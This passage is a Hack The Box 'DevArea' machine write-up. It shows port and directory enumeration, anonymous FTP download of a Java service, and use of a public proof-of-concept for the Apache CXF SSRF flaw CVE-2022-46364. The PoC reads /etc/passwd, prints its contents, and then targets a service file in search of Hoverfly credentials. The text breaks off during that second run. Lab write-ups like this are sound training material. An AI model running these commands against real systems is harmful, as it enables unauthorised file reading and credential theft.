# DevArea HTB Medium Machine Writeup

## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV -v 10.129.244.208 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-27 19:56 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
Initiating NSE at 19:56
Completed NSE at 19:56, 0.00s elapsed
Initiating Ping Scan at 19:56
Scanning 10.129.244.208 [4 ports]
Completed Ping Scan at 19:56, 0.21s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:56
Scanning devarea.htb (10.129.244.208) [1000 ports]
Discovered open port 80/tcp on 10.129.244.208
Discovered open port 22/tcp on 10.129.244.208
Discovered open port 8080/tcp on 10.129.244.208
Discovered open port 21/tcp on 10.129.244.208
Discovered open port 8888/tcp on 10.129.244.208
Increasing send delay for 10.129.244.208 from 0 to 5 due to 194 out of 646 dropped probes since last increase.
Increasing send delay for 10.129.244.208 from 5 to 10 due to 11 out of 24 dropped probes since last increase.
Increasing send delay for 10.129.244.208 from 10 to 20 due to 11 out of 24 dropped probes since last increase.
Increasing send delay for 10.129.244.208 from 20 to 40 due to 11 out of 22 dropped probes since last increase.
Increasing send delay for 10.129.244.208 from 40 to 80 due to 11 out of 17 dropped probes since last increase.
Increasing send delay for 10.129.244.208 from 80 to 160 due to 11 out of 15 dropped probes since last increase.
Increasing send delay for 10.129.244.208 from 160 to 320 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.129.244.208 from 320 to 640 due to 11 out of 12 dropped probes since last increase.
Increasing send delay for 10.129.244.208 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
Discovered open port 8500/tcp on 10.129.244.208
Completed SYN Stealth Scan at 20:01, 282.84s elapsed (1000 total ports)
Initiating Service scan at 20:01                                                 
Scanning 6 services on devarea.htb (10.129.244.208)                              
Completed Service scan at 20:01, 31.01s elapsed (6 services on 1 host)           
NSE: Script scanning 10.129.244.208.                                             
Initiating NSE at 20:01                                                          
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.                       
Completed NSE at 20:02, 11.27s elapsed
Initiating NSE at 20:02
Completed NSE at 20:02, 2.62s elapsed
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
Nmap scan report for devarea.htb (10.129.244.208)
Host is up (0.26s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.11
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: DevArea - Connect with Top Development Talent
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.58 (Ubuntu)
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Error 404 Not Found
8500/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 27 Jun 2026 13:02:00 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 27 Jun 2026 13:01:42 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   HTTPOptions: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 27 Jun 2026 13:01:43 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: BAA090FBC1418C8C4971002CC5459574
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8500-TCP:V=7.98%I=7%D=6/27%Time=6A3FC9AC%P=aarch64-unknown-linux-gn
SF:u%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Serv
SF:er\x20Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Conte
SF:nt-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2027\x20Jun\x202026\x2013
SF::01:42\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\
SF:x20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\
SF:n")%r(HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nDate:\x20Sat,\x2027\x20Jun\x202026\x2013:01:43\x20GMT
SF:\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x
SF:20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPReq
SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500
SF:\x20Internal\x20Server\x20Error\r\nContent-Type:\x20text/plain;\x20char
SF:set=utf-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2027\
SF:x20Jun\x202026\x2013:02:00\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\
SF:x20is\x20a\x20proxy\x20server\.\x20Does\x20not\x20respond\x20to\x20non-
SF:proxy\x20requests\.\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
Initiating NSE at 20:02
Completed NSE at 20:02, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 328.40 seconds
           Raw packets sent: 1600 (70.376KB) | Rcvd: 6030 (1.230MB)
```

## Web Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://devarea.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devarea.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [1/4614] :: Job [1/1] :: 0 req/sec :: D:: Progress: [40/4614] :: Job [1/1] :: 0 req/sec :: :: Progress: [40/4614] :: Job [1/1] :: 0 req/sec ::                         [Status: 200, Size: 22211, Words: 9908, Lines: 475, Duration: 189ms]
:: Progress: [55/4614] :: Job [1/1] :: 0 req/sec :: :: Progress: [57/4614] :: Job [1/1] :: 0 req/sec :: .htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 191ms]
:: Progress: [57/4614] :: Job [1/1] :: 0 req/sec :: .hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 194ms]
:: Progress: [69/4614] :: Job [1/1] :: 0 req/sec :: .htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 194ms]
:: Progress: [78/4614] :: Job [1/1] :: 0 req/sec :: :: Progress: [80/4614] :: Job [1/1] :: 0 req/sec :: :: Progress: [120/4614] :: Job [1/1] :: 0 req/sec :::: Progress: [160/4614] :: Job [1/1] :: 0 req/sec :::: Progress: [160/4614] :: Job [1/1] :: 0 req/sec :::: Progress: [200/4614] :: Job [1/1] :: 280 req/sec :: Progress: [240/4614] :: Job [1/1] :: 264 req/sec :: Progress: [240/4614] :: Job [1/1] :: 264 req/sec :: Progress: [280/4614] :: Job [1/1] :: 263 req/sec :: Progress: [320/4614] :: Job [1/1] :: 264 req/sec :: Progress: [320/4614] :: Job [1/1] :: 264 req/sec :: Progress: [360/4614] :: Job [1/1] :: 261 req/sec :: Progress: [400/4614] :: Job [1/1] :: 262 req/sec :: Progress: [415/4614] :: Job [1/1] :: 220 req/sec :: Progress: [440/4614] :: Job [1/1] :: 260 req/sec :: Progress: [480/4614] :: Job [1/1] :: 262 req/sec :: Progress: [506/4614] :: Job [1/1] :: 220 req/sec :: Progress: [520/4614] :: Job [1/1] :: 261 req/sec assets                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 179ms]
:: Progress: [539/4614] :: Job [1/1] :: 218 req/sec :: Progress: [560/4614] :: Job [1/1] :: 260 req/sec :: Progress: [591/4614] :: Job [1/1] :: 220 req/sec :: Progress: [600/4614] :: Job [1/1] :: 260 req/sec :: Progress: [640/4614] :: Job [1/1] :: 262 req/sec :: Progress: [680/4614] :: Job [1/1] :: 261 req/sec :: Progress: [689/4614] :: Job [1/1] :: 222 req/sec :: Progress: [720/4614] :: Job [1/1] :: 261 req/sec :: Progress: [760/4614] :: Job [1/1] :: 261 req/sec :: Progress: [774/4614] :: Job [1/1] :: 222 req/sec :: Progress: [800/4614] :: Job [1/1] :: 262 req/sec :: Progress: [840/4614] :: Job [1/1] :: 261 req/sec :: Progress: [856/4614] :: Job [1/1] :: 221 req/sec :: Progress: [880/4614] :: Job [1/1] :: 259 req/sec :: Progress: [920/4614] :: Job [1/1] :: 260 req/sec :: Progress: [941/4614] :: Job [1/1] :: 221 req/sec :: Progress: [960/4614] :: Job [1/1] :: 256 req/sec :: Progress: [1000/4614] :: Job [1/1] :: 259 req/sec:: Progress: [1040/4614] :: Job [1/1] :: 259 req/sec:: Progress: [1040/4614] :: Job [1/1] :: 259 req/sec:: Progress: [1080/4614] :: Job [1/1] :: 256 req/sec:: Progress: [1114/4614] :: Job [1/1] :: 216 req/sec:: Progress: [1122/4614] :: Job [1/1] :: 220 req/sec:: Progress: [1160/4614] :: Job [1/1] :: 253 req/sec:: Progress: [1200/4614] :: Job [1/1] :: 253 req/sec:: Progress: [1202/4614] :: Job [1/1] :: 220 req/sec:: Progress: [1240/4614] :: Job [1/1] :: 255 req/sec:: Progress: [1280/4614] :: Job [1/1] :: 255 req/sec:: Progress: [1290/4614] :: Job [1/1] :: 219 req/sec:: Progress: [1320/4614] :: Job [1/1] :: 251 req/sec:: Progress: [1360/4614] :: Job [1/1] :: 250 req/sec:: Progress: [1377/4614] :: Job [1/1] :: 220 req/sec:: Progress: [1400/4614] :: Job [1/1] :: 248 req/sec:: Progress: [1440/4614] :: Job [1/1] :: 250 req/sec:: Progress: [1457/4614] :: Job [1/1] :: 220 req/sec:: Progress: [1480/4614] :: Job [1/1] :: 250 req/sec:: Progress: [1520/4614] :: Job [1/1] :: 246 req/sec:: Progress: [1537/4614] :: Job [1/1] :: 222 req/sec:: Progress: [1562/4614] :: Job [1/1] :: 224 req/sec:: Progress: [1600/4614] :: Job [1/1] :: 244 req/sec:: Progress: [1624/4614] :: Job [1/1] :: 212 req/sec:: Progress: [1644/4614] :: Job [1/1] :: 221 req/sec:: Progress: [1680/4614] :: Job [1/1] :: 245 req/sec:: Progress: [1720/4614] :: Job [1/1] :: 245 req/sec:: Progress: [1737/4614] :: Job [1/1] :: 232 req/sec:: Progress: [1760/4614] :: Job [1/1] :: 245 req/sec:: Progress: [1800/4614] :: Job [1/1] :: 244 req/sec:: Progress: [1817/4614] :: Job [1/1] :: 232 req/sec:: Progress: [1841/4614] :: Job [1/1] :: 222 req/sec:: Progress: [1880/4614] :: Job [1/1] :: 243 req/sec:: Progress: [1897/4614] :: Job [1/1] :: 231 req/sec:: Progress: [1920/4614] :: Job [1/1] :: 241 req/sec:: Progress: [1960/4614] :: Job [1/1] :: 236 req/sec:: Progress: [1978/4614] :: Job [1/1] :: 221 req/sec:: Progress: [2003/4614] :: Job [1/1] :: 222 req/sec:: Progress: [2040/4614] :: Job [1/1] :: 237 req/secindex                   [Status: 200, Size: 22211, Words: 9908, Lines: 475, Duration: 181ms]
:: Progress: [2057/4614] :: Job [1/1] :: 222 req/sec:: Progress: [2058/4614] :: Job [1/1] :: 222 req/secindex.html              [Status: 200, Size: 22211, Words: 9908, Lines: 475, Duration: 188ms]
:: Progress: [2061/4614] :: Job [1/1] :: 215 req/sec:: Progress: [2083/4614] :: Job [1/1] :: 222 req/sec:: Progress: [2120/4614] :: Job [1/1] :: 236 req/sec:: Progress: [2142/4614] :: Job [1/1] :: 217 req/sec:: Progress: [2166/4614] :: Job [1/1] :: 221 req/sec:: Progress: [2200/4614] :: Job [1/1] :: 237 req/sec:: Progress: [2233/4614] :: Job [1/1] :: 218 req/sec:: Progress: [2258/4614] :: Job [1/1] :: 229 req/sec:: Progress: [2280/4614] :: Job [1/1] :: 236 req/sec:: Progress: [2320/4614] :: Job [1/1] :: 239 req/sec:: Progress: [2338/4614] :: Job [1/1] :: 228 req/sec:: Progress: [2363/4614] :: Job [1/1] :: 228 req/sec:: Progress: [2400/4614] :: Job [1/1] :: 240 req/sec:: Progress: [2421/4614] :: Job [1/1] :: 222 req/sec:: Progress: [2443/4614] :: Job [1/1] :: 228 req/sec:: Progress: [2480/4614] :: Job [1/1] :: 234 req/sec:: Progress: [2502/4614] :: Job [1/1] :: 228 req/sec:: Progress: [2529/4614] :: Job [1/1] :: 225 req/sec:: Progress: [2560/4614] :: Job [1/1] :: 234 req/sec:: Progress: [2582/4614] :: Job [1/1] :: 229 req/sec:: Progress: [2609/4614] :: Job [1/1] :: 226 req/sec:: Progress: [2640/4614] :: Job [1/1] :: 233 req/sec:: Progress: [2676/4614] :: Job [1/1] :: 222 req/sec:: Progress: [2689/4614] :: Job [1/1] :: 227 req/sec:: Progress: [2723/4614] :: Job [1/1] :: 227 req/sec:: Progress: [2760/4614] :: Job [1/1] :: 233 req/sec:: Progress: [2774/4614] :: Job [1/1] :: 220 req/sec:: Progress: [2803/4614] :: Job [1/1] :: 228 req/sec:: Progress: [2840/4614] :: Job [1/1] :: 234 req/sec:: Progress: [2862/4614] :: Job [1/1] :: 227 req/sec:: Progress: [2889/4614] :: Job [1/1] :: 232 req/sec:: Progress: [2920/4614] :: Job [1/1] :: 235 req/sec:: Progress: [2950/4614] :: Job [1/1] :: 222 req/sec:: Progress: [2969/4614] :: Job [1/1] :: 233 req/sec:: Progress: [3000/4614] :: Job [1/1] :: 236 req/sec:: Progress: [3030/4614] :: Job [1/1] :: 222 req/sec:: Progress: [3049/4614] :: Job [1/1] :: 233 req/sec:: Progress: [3083/4614] :: Job [1/1] :: 227 req/sec:: Progress: [3120/4614] :: Job [1/1] :: 235 req/sec:: Progress: [3134/4614] :: Job [1/1] :: 224 req/sec:: Progress: [3163/4614] :: Job [1/1] :: 226 req/sec:: Progress: [3200/4614] :: Job [1/1] :: 236 req/sec:: Progress: [3218/4614] :: Job [1/1] :: 220 req/sec:: Progress: [3249/4614] :: Job [1/1] :: 230 req/sec:: Progress: [3280/4614] :: Job [1/1] :: 235 req/sec:: Progress: [3310/4614] :: Job [1/1] :: 225 req/sec:: Progress: [3329/4614] :: Job [1/1] :: 227 req/sec:: Progress: [3360/4614] :: Job [1/1] :: 230 req/sec:: Progress: [3393/4614] :: Job [1/1] :: 222 req/sec:: Progress: [3414/4614] :: Job [1/1] :: 227 req/sec:: Progress: [3443/4614] :: Job [1/1] :: 227 req/sec:: Progress: [3475/4614] :: Job [1/1] :: 217 req/sec:: Progress: [3498/4614] :: Job [1/1] :: 224 req/sec:: Progress: [3523/4614] :: Job [1/1] :: 229 req/sec:: Progress: [3555/4614] :: Job [1/1] :: 219 req/sec:: Progress: [3584/4614] :: Job [1/1] :: 222 req/sec:: Progress: [3607/4614] :: Job [1/1] :: 222 req/secserver-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 179ms]
:: Progress: [3626/4614] :: Job [1/1] :: 221 req/sec:: Progress: [3640/4614] :: Job [1/1] :: 224 req/sec:: Progress: [3670/4614] :: Job [1/1] :: 224 req/sec:: Progress: [3690/4614] :: Job [1/1] :: 221 req/sec:: Progress: [3723/4614] :: Job [1/1] :: 229 req/sec:: Progress: [3753/4614] :: Job [1/1] :: 228 req/sec:: Progress: [3778/4614] :: Job [1/1] :: 224 req/sec:: Progress: [3803/4614] :: Job [1/1] :: 223 req/sec:: Progress: [3835/4614] :: Job [1/1] :: 226 req/sec:: Progress: [3861/4614] :: Job [1/1] :: 222 req/sec:: Progress: [3883/4614] :: Job [1/1] :: 221 req/sec:: Progress: [3915/4614] :: Job [1/1] :: 226 req/sec:: Progress: [3944/4614] :: Job [1/1] :: 222 req/sec:: Progress: [3963/4614] :: Job [1/1] :: 219 req/sec:: Progress: [3995/4614] :: Job [1/1] :: 237 req/sec:: Progress: [4033/4614] :: Job [1/1] :: 226 req/sec:: Progress: [4043/4614] :: Job [1/1] :: 227 req/sec:: Progress: [4075/4614] :: Job [1/1] :: 228 req/sec:: Progress: [4080/4614] :: Job [1/1] :: 216 req/sec:: Progress: [4086/4614] :: Job [1/1] :: 183 req/sec:: Progress: [4116/4614] :: Job [1/1] :: 193 req/sec:: Progress: [4136/4614] :: Job [1/1] :: 175 req/sec:: Progress: [4166/4614] :: Job [1/1] :: 180 req/sec:: Progress: [4198/4614] :: Job [1/1] :: 184 req/sec:: Progress: [4206/4614] :: Job [1/1] :: 178 req/sec:: Progress: [4246/4614] :: Job [1/1] :: 179 req/sec:: Progress: [4278/4614] :: Job [1/1] :: 187 req/sec:: Progress: [4286/4614] :: Job [1/1] :: 227 req/sec:: Progress: [4324/4614] :: Job [1/1] :: 225 req/sec:: Progress: [4351/4614] :: Job [1/1] :: 220 req/sec:: Progress: [4366/4614] :: Job [1/1] :: 231 req/sec:: Progress: [4402/4614] :: Job [1/1] :: 215 req/sec:: Progress: [4431/4614] :: Job [1/1] :: 222 req/sec:: Progress: [4446/4614] :: Job [1/1] :: 231 req/sec:: Progress: [4486/4614] :: Job [1/1] :: 232 req/sec:: Progress: [4520/4614] :: Job [1/1] :: 228 req/sec:: Progress: [4551/4614] :: Job [1/1] :: 230 req/sec:: Progress: [4566/4614] :: Job [1/1] :: 237 req/sec:: Progress: [4566/4614] :: Job [1/1] :: 237 req/sec:: Progress: [4566/4614] :: Job [1/1] :: 237 req/sec:: Progress: [4606/4614] :: Job [1/1] :: 211 req/sec:: Progress: [4614/4614] :: Job [1/1] :: 213 req/sec:: Progress: [4614/4614] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:21] :: Errors: 0 ::
                                                    
┌──(jameskaois㉿kali)-[~]
└─$ 

```
Found `http://devarea.htb:8888/login`, Hoverfly app

## FTP Get File
```bash
┌──(jameskaois㉿kali)-[~]
└─$ ftp 10.129.244.208
Connected to 10.129.244.208.
220 (vsFTPd 3.0.5)
Name (10.129.244.208:jameskaois): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45225|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||46792|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 22  2025 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 22  2025 ..
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||49133|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
ftp> binary
200 Switching to Binary mode.
ftp> get employee-service.jar
local: employee-service.jar remote: employee-service.jar
229 Entering Extended Passive Mode (|||45232|)
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
100% |************************************|  6293 KiB    1.38 MiB/s    00:00 ETA
226 Transfer complete.
6445030 bytes received in 00:04 (1.32 MiB/s)
ftp> 

```
Used `JD-GUI`, to see what its content has:
```java
%% ServerStarter.class %%
package htb.devarea;

import org.apache.cxf.jaxws.JaxWsServerFactoryBean;

public class ServerStarter {
  public static void main(String[] args) {
    JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
    factory.setServiceClass(EmployeeService.class);
    factory.setServiceBean(new EmployeeServiceImpl());
    factory.setAddress("http://0.0.0.0:8080/employeeservice");
    factory.create();
    System.out.println("Employee Service running at http://localhost:8080/employeeservice");
    System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
  }
}
```
The app is running `Apache CXF framework implementing JAX-WS`, `SOAP Web Service`, `**Jetty server running version 9.4.27.`
## Web Exploitation
Leveraging https://github.com/kasem545/CVE-2022-46364-Poc
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/devarea]
└─$ python3 CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice -s file:///etc/passwd -d devarea.htb

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██╗  ██╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗                                                     
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ██║  ██║██╔════╝ ╚════██╗██╔════╝ ██║  ██║                                                     
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝     ███████║███████╗  █████╔╝███████╗ ███████║                                                     
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗     ╚════██║██╔═══██╗██╔═══╝ ██╔═══██╗╚════██║                                                     
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝          ██║╚██████╔╝███████╗╚██████╔╝     ██║                                                     
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝           ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝                                                     
                                                                                 

======================================================================           
  CVE-2022-46364 | Apache CXF SSRF via MTOM XOP:Include                          
  CVSS 9.8 CRITICAL | CWE-918                                                    
======================================================================           
                                                                                 
[CONFIG]
  Target:   http://devarea.htb:8080/employeeservice
  SSRF URL: file:///etc/passwd
  Domain:   devarea.htb
  Method:   MTOM

[*] Sending exploit payload...
[+] Server responded: HTTP 200

[RAW RESPONSE SNIPPET]
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjpt                                                                   

[BASE64 EXTRACTED]
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xv...                                        

[EXFILTRATED CONTENT]
======================================================================
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
_laurel:x:999:987::/var/log/laurel:/bin/false
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false

======================================================================

[✓] EXPLOIT SUCCESSFUL
Server fetched internal resource and returned contents.
```
Confirming now we can use this to read files in the server, for the Hoverfly found CVE-2025-54123, however we have to be authorized in order to exploit this:
![[Pasted image 20260627205546.png]]
Look for Hoverfly creds:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/devarea]
└─$ python3 CVE-2022-46364.py -t http://devarea.htb:8080/employeeservice -s file:///etc/systemd/system/hoverfly.service -d devarea.htb

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██╗  ██╗ ██████╗ ██████╗  ██████╗ ██╗  ██╗                                                     
